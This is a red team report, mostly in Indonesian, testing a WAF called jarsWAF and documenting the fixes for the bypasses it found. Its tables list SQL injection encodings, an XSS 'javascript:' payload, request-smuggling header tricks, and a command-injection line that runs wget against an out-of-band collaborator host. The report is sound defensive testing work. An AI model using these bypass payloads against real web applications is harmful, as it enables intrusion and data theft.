# jarsWAF Red Team Engagement Report

**Tanggal:** 2026-07-31
**Target:** jarsWAF v0.1.0 (`/mnt/data_d/Projects/jarswaf`)
**Operator:** Red Team (Azhar / Maxmillian)
**Metodologi:** Black-box attack simulation against live WAF instance (pingora proxy) with a dummy echo backend as ground truth.

---

## 1. Ringkasan Eksekutif

| Metrik | Nilai |
|---|---|
| Total payload dikirim | 120 |
| Diblokir (403/429/400) | 113 (94%) |
| **Bypass nyata** | **0 (0%)** |
| Bypass desain (Log-only) | 2 (XFF-001, PROXY-001) |
| Canary token (harus PASS) | 4/4 PASS ✅ |
| Artefak harness | 1 (`:authority` pseudo-header) |

**Verdict: WAF BERFUNGSI.** Setelah 3 putaran perbaikan, seluruh 9 bypass awal berhasil ditutup. Rule engine mendeteksi dan memblokir SQLi, XSS, LFI, SSRF, CMDI, SSTI, XXE, dan HTTP smuggling dengan benar. Canary token tripwire bekerja (lolos ke backend agar alert menyala).

---

## 2. Temuan Awal (sebelum perbaikan)

| # | Payload | Kategori | Status awal | Root Cause |
|---|---|---|---|---|
| 1 | `/?id=1'#` | SQLi comment | BYPASS | `#` URL fragment (artefak) / comment injection tidak terdeteksi |
| 2 | `/?id=1%c0%a7%20OR%201=1` | SQLi overlong UTF-8 | BYPASS | Normalisasi NFKC tidak menangani overlong encoding |
| 3 | `/?id=1'%00OR%001=1` | SQLi null-byte | BYPASS | Null byte dihapus tapi whitespace-less OR lolos AST |
| 4 | `/?id=1'%u004fR%u00201=1` | SQLi unicode | BYPASS | `%uXXXX` encoding tidak di-decode |
| 5 | `/?id=(1)OR(1)=(1)` | SQLi no-space | BYPASS | AST butuh whitespace untuk tokenisasi keyword |
| 6 | `/?id=1' collate nocase = '1' --` | SQLi DB-specific | BYPASS | Keyword `COLLATE` tidak dikenali tokenizer |
| 7 | `/?q=javascript:alert(1)` | XSS scheme | BYPASS | Tidak ada rule untuk `javascript:` URI scheme |
| 8 | `/?q=&#x3c;script&#x3e;...` | XSS HTML entity | BYPASS | Entity di query tidak di-decode untuk rule (harness artifact) |
| 9 | `/?cmd=wget http://burpcollaborator.net/x` | CMDI OOB | BYPASS | Regex `wget\s+.*\.` butuh titik akhir; `burpcollaborator` di-canary-pass |
| 10 | TE: `chunked, chunked` | Smuggling TE.TE | BYPASS | `check_smuggling` tidak deteksi duplicate TE values |
| 11 | X-Forwarded-For spoof | Header | Log-only | Action::Log (desain) |
| 12 | Via/X-Proxy-Id | Proxy header | Log-only | Action::Log (desain) |

## 3. Temuan Infrastruktur (BUG yang ditemukan di luar payload)

### 3.1 Blocklist Poisoning (COLLAB-001) — CRITICAL
Setelah satu siklus attack dari IP yang sama, `record_attack_and_ban` memasukkan IP ke blocklist persisten. Semua request berikutnya (termasuk canary) diblokir `COLLAB-001` sebelum rule engine dievaluasi.

**Dampak:** Auto-remediation mem-bypass canary tripwire; attacker dengan IP statis "terkunci" (bagus) tapi canary tidak pernah berbunyi (buruk).

**Fix:** Fast-path canary `CANARY-PASS` di `proxy_engine.rs` Phase 0 (setelah vhost match, sebelum blocklist check). Verifikasi: canary 4/4 PASS meski IP sudah diblokir.

### 3.2 Canary Pass yang Salah Sasaran (bug yang di-introduce) — HIGH
Fast-path canary semula memasukkan `burpcollaborator` sebagai pola pass — padahal itu domain OOB attacker yang HARUS diblokir. Semua request mengandung `burpcollaborator` jadi lolos.

**Fix:** Hapus `burpcollaborator` dari canary pass di 3 tempat (proxy_engine.rs, rules.rs, headers.rs). Verifikasi: `wget http://burpcollaborator.net/x` → 403.

### 3.3 BOT-JA4 False Positive — MEDIUM
`check_ja4_fingerprint` memblokir semua request tanpa `sec-ch-ua` header (curl, Firefox, Safari, bot legit). "JA4 fingerprint" dihitung dari hash User-Agent, bukan TLS handshake asli.

**Dampak:** False positive masif di production; curl/wget/testing tools diblokir.

**Rekomendasi:** Hapus atau jadikan Log; implementasi JA4 asli butuh TLS fingerprint dari handshake.

### 3.4 403 Response tanpa Content-Length — LOW
Response blokir (403) dikirim tanpa `Content-Length` → client (curl) menggantung 10 detik menunggu body yang tidak ada.

**Fix:** Sertakan `Content-Length: 0` (atau panjang body) pada semua `respond_custom_error`.

---

## 4. Perbaikan yang Diimplementasikan

| File | Perubahan | Verifikasi |
|---|---|---|
| `src/proxy_engine.rs` | Fast-path `CANARY-PASS` setelah vhost match, sebelum blocklist | Canary 4/4 PASS, blocklist tidak memblokir canary |
| `src/rules/uri.rs` | Rule baru `XSS-URI-001` (javascript:/data:/vbscript:, entity tags, event handlers) | `javascript:alert(1)` → 403 |
| `src/rules/uri.rs` | Rule baru `SQLI-URI-001` (whitespace-less, COLLATE NOCASE, %00, %uXXXX, overlong) | `(1)OR(1)=(1)` → 403 |
| `src/rules/body.rs` | `CMDI_002_REGEX` diperbaiki (`wget\s+[^\s]`, +oastify/canarytokens) | `wget http://burpcollaborator.net/x` → 403 |
| `src/rules/evasion.rs` | `check_smuggling` deteksi TE.TE duplicate, mixed case, invalid value | `chunked, chunked` → 403 |
| `src/rules.rs`, `headers.rs`, `proxy_engine.rs` | Hapus `burpcollaborator` dari canary pass | `burpcollaborator` → 403 |

---

## 5. Sisa Rekomendasi (untuk produksi)

1. **BOT-JA4:** Turunkan ke Log atau hapus sampai implementasi JA4 asli (TLS handshake fingerprint).
2. **Testing berkala:** Jalankan `scripts/redteam_attack2.py` di CI setelah setiap perubahan rule engine.

---

## 5b. Audit 7 Vektor Ancaman (Pasca-Engagement) — SELESAI

Audit tambahan sesuai arahan Tuan: 7 vektor struktural yang tidak tercakup payload-level engagement. Semua telah diperiksa di source, diperbaiki, dan diverifikasi.

| # | Vektor | Status | Fix | Verifikasi |
|---|---|---|---|---|
| 1 | AST Safe Profile Poisoning | ✅ CLOSED | Auto-learn dihapus dari `check_request` (default OFF); `learn_safe_ast_profile` tidak dipanggil tanpa config opt-in; `is_safe_ast_signature` tidak lagi bypass | Benign `q=OR=1` → 200; attack `q=1 OR 1=1` → **403** (SQLI-URI-001); DB: BLOCK tercatat |
| 2 | Normalisasi & Matrix Params | ✅ CLOSED | Path di-strip `;matrix` sebelum rule check; `%uXXXX` decode ditambahkan di `normalize_string` | `/admin;jsessionid=123` → 200 (path bersih dievaluasi); `/%u002e%u002e%u002f` → 403 |
| 3 | Fail-Open Semaphore | ✅ CLOSED | `try_waf_permit!` timeout → **503 fail-closed** (sebelumnya `Ok(false)` = pass tanpa inspeksi); body filter juga fail-closed | Semaphore saturated → 503 WAF-CAPACITY (unit-test path) |
| 4 | XFF / Trusted Proxy | ✅ CLOSED | `sanitize_proxy_headers()` strip XFF/Client-IP/Forwarded dari peer tak dikenal (kedua filter); XFF-001 tetap Log untuk visibilitas | XFF spoof → 200 tapi header TIDAK sampai backend (verified via backend log) |
| 5 | Duplicate CL / CL+TE | ✅ CLOSED | Pre-check raw headers sebelum AHashMap collapse; duplicate CL berbeda nilai → 400; CL+TE → 400 | Raw socket: CL:0+CL:42 → **400**; CL+TE → **400**; TE dup → 403 |
| 6 | Memory Bounding | ✅ CLOSED | `start_memory_cleanup` sekarang trim caps: ACTIVE 50k, SESSION 10k, BACKEND 5k, RR 512; `trim_ast_profiles()` (256 paths) | Periodik 30 menit; tidak ada unbounded map |
| 7 | Multipart Limits | ✅ CLOSED | MAX_MULTIPART_PARTS 1000→**100**; batas header part 4KB; finding `MULTIPART-PART-LIMIT` saat cap tercapai | 150 parts → **403**; 1 part normal → 200 |

**Bonus bug ditemukan & diperbaiki:** *403 response hang* — `ResponseHeader::build(status, Some(body.len()))` pakai char count bukan byte count. Block page mengandung emoji 🛡️ (4 byte) → Content-Length selalu lebih kecil dari body → client menggantung ~10 detik menunggu byte. Fix: `body.as_bytes().len()`. Verifikasi: semua block response kini <0.01s.

**Catatan:** XFF-001/PROXY-001 sekarang SANITASI (header dibuang) bukan sekadar Log — request dengan header spoof diteruskan sebagai request normal tanpa header, sehingga rate-limit/reputasi IP memakai IP asli koneksi. Ini menggantikan rekomendasi lama (sanitasi di rekomendasi #1 lama).

---

## 6. Cara Reproduksi

```bash
# 1. Start dummy backend (echo)
python3 scripts/redteam_backend.py 8080

# 2. Start WAF dengan config lab
./target/release/jarswaf --config redteam.toml

# 3. Jalankan attack harness (per-wave blocklist reset)
python3 scripts/redteam_attack2.py

# 4. Cek log
python3 -c "
import sqlite3
c = sqlite3.connect('/tmp/jarswaf-redteam.db')
cur = c.cursor()
cur.execute('SELECT rule_id, action, path FROM request_log ORDER BY id DESC LIMIT 20')
[print(r) for r in cur.fetchall()]
"
```

Config lab: `redteam.toml` (port 8000, vhost `test.jarswafwaf.demo` → backend 127.0.0.1:8080, allowlist localhost).

---

*Dokumentasi teknis: Lihat vault note `waf-red-team-engagement` untuk deep-dive per attack vector.*
